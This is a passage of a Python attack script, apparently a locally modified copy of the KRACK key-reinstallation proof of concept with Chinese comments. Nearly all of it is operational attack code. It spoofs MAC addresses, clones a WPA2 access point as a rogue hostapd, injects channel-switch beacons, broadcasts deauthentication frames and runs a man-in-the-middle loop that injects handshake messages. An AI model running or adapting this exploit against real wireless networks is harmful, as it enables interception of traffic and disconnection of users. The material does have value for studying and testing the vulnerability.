		log(STATUS, "Note: keep >1 meter between both interfaces. Else packet delivery is unreliable & target may disconnect")

		# 1. Remove unused virtual interfaces
		if self.nic_rogue_mon is None:
			subprocess.call(["iw", self.nic_rogue_ap + "mon", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

		# 2. Configure monitor mode on interfaces
		subprocess.check_output(["ifconfig", self.nic_real_mon, "down"])
		subprocess.check_output(["iwconfig", self.nic_real_mon, "mode", "monitor"])
		if self.nic_rogue_mon is None:
			self.nic_rogue_mon = self.nic_rogue_ap + "mon"
			subprocess.check_output(["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "managed"])
			subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
			time.sleep(0.2)

		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "down"])
		subprocess.check_output(["iwconfig", self.nic_rogue_mon, "mode", "monitor"])
		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])

		# 如果有指定 client 端的 MAC addr.，將此網卡的 MAC addr.換成 client 端的
		if self.clientmac:
				subprocess.check_output(["ifconfig", self.nic_real_clientack, "down"])
				call_macchanger(self.nic_real_clientack, self.clientmac)
		else:
			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
			log(WARNING, "WARNING: Targeting ALL clients is not fully supported! Please provide a specific target using --target.")
			# Sleep for a second to make this warning very explicit
			time.sleep(1)

		# 4. Finally put the interfaces up
		subprocess.check_output(["ifconfig", self.nic_real_mon, "up"])
		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
	
	# 主要執行 func.
	def run(self, strict_echo_test=False):
		self.configure_interfaces()

		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real_mon     , dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
		self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon, dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
		# 測試監聽模式是否有正常運行，並且取得 wifi ap 的 MAC addr.
		self.find_beacon(self.ssid)
		if self.beacon is None:
			log(ERROR, "No beacon received of network <%s>. Is monitor mode working? Did you enter the correct SSID?" % self.ssid)
			return
		# 將 wifi ap 的 beacon 訊息紀錄，用來產生 hostapd.conf
		self.netconfig = NetworkConfig()
		self.netconfig.from_beacon(self.beacon)
		if not self.netconfig.is_wparsn():
			log(ERROR, "Target network is not an encrypted WPA or WPA2 network, exiting.")
			return
		elif self.netconfig.real_channel > 13:
			log(WARNING, "Attack not yet tested against 5 GHz networks.")
		self.netconfig.find_rogue_channel()

		log(STATUS, "Target network %s detected on channel %d" % (self.apmac, self.netconfig.real_channel), color="green")
		log(STATUS, "Will create rogue AP on channel %d" % self.netconfig.rogue_channel, color="green")
		# 將強盜 AP 的 MAC addr. 設成原始 AP 的 MAC addr.
		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
		set_mac_address(self.nic_rogue_ap, self.apmac)

		# Put the client ACK interface up (at this point switching channels on nic_real may no longer be possible)
		if self.nic_real_clientack: 
			subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])
			subprocess.check_output(["ifconfig", self.nic_real_mon, "up"])

		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
		with open("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "w") as fp:
			fp.write(self.netconfig.write_config(self.nic_rogue_ap))

		self.hostapd = subprocess.Popen("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
		time.sleep(10)

		# when domain name (encode) to idna, label empty or too long error, 
		# that is because domain name uses "." to split label,
		# every label limited to longest 63 characters or no empty.
		self.hostapd_ctrl = Ctrl("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_ctrl/" + self.nic_rogue_ap) # "hostapd_ctrl/"
		self.hostapd_ctrl.attach()

		# Inject some CSA beacons to push victims to our channel
		self.send_csa_beacon(numbeacons=4)

		# deauthenticated 所有 client端，讓 AP 端重新四次交握
		dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)
		deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
		self.sock_real.send(deauth)

		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
		if self.clientmac:
			self.queue_disas(self.clientmac)

		# Continue attack by monitoring both channels and performing needed actions
		self.last_real_beacon = time.time()
		self.last_rogue_beacon = time.time()
		nextbeacon = time.time() + 0.01
		while True:
			sel = select.select([self.sock_real, self.sock_rogue, self.hostapd.stdout], [], [], 0.1)
			if self.sock_real      in sel[0]: self.handle_rx_realchan()
			if self.sock_rogue     in sel[0]: self.handle_rx_roguechan()
			if self.hostapd.stdout in sel[0]: self.handle_hostapd_out()

			if self.time_forward_group1 and self.time_forward_group1 <= time.time():
				p = self.group1.pop(0)
				self.sock_rogue.send(p)
				self.time_forward_group1 = None
				log(STATUS, "Injected older group message 1: %s" % dot11_to_str(p), color="green")

			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
				self.send_disas(self.disas_queue.pop()[1])

			if self.continuous_csa and nextbeacon <= time.time():
				self.send_csa_beacon(silent=True)
				nextbeacon += 0.10

			if self.last_real_beacon + 2 < time.time():
				log(WARNING, "WARNING: Didn't receive beacon from real AP for two seconds")
				self.last_real_beacon = time.time()
			if self.last_rogue_beacon + 2 < time.time():
				log(WARNING, "WARNING: Didn't receive beacon from rogue AP for two seconds")
				self.last_rogue_beacon = time.time()


	def stop(self):
		log(STATUS, "Closing hostapd and cleaning up ...")
		if self.hostapd:
			self.hostapd.terminate()
			self.hostapd.wait()
		if self.sock_real: self.sock_real.close()
		if self.sock_rogue: self.sock_rogue.close()

def cleanup():
	attack.stop()

if __name__ == "__main__":
	description = textwrap.dedent(
		"""\
		Key Reinstallation Attacks (KRACKs) by Mathy Vanhoef
		-----------------------------------------------------------
		  - Uses CSA beacons to obtain channel-based MitM position
		  - Can detect and handle wpa_supplicant all-zero key installations""")
	parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
	# 必要的參數
	parser.add_argument("nic_real_mon", help="Wireless monitor interface that will listen on the channel of the target AP.")
	parser.add_argument("nic_real_clientack", help="Wireless monitor interface that will station on the channel of the target AP.")
	parser.add_argument("nic_rogue_mon", help="Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.")
	parser.add_argument("nic_rogue_ap", help="Wireless monitor interface that will run a rogue AP using a modified hostapd.")
	parser.add_argument("ssid", help="The SSID of the network to attack.")
	parser.add_argument("password", help="The password of the network to attack.")

	# 選擇性參數
	parser.add_argument("-t", "--target", help="Specifically target the client with the given MAC address.")
	parser.add_argument("-p", "--dump", help="Dump captured traffic to the pcap files <this argument name>.<nic>.pcap")
	parser.add_argument("-d", "--debug", action="count", help="increase output verbosity", default=0)
	parser.add_argument("--strict-echo-test", help="Never treat frames received from the air as echoed injected frames", action='store_true')
	parser.add_argument("--continuous-csa", help="Continuously send CSA beacons on the real channel (10 every second)", action='store_true')
	parser.add_argument("--group", help="Perform attacks on the group key handshake only", action='store_true')

	args = parser.parse_args()

	global_log_level = max(ALL, global_log_level - args.debug)

	print("\n\t===[ KRACK Attacks against Linux/Android by Mathy Vanhoef ]====\n")
	attack = KRAckAttack(args.nic_real_mon, args.nic_real_clientack, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.target, args.dump, args.continuous_csa)
	atexit.register(cleanup)
	attack.run(strict_echo_test=args.strict_echo_test)

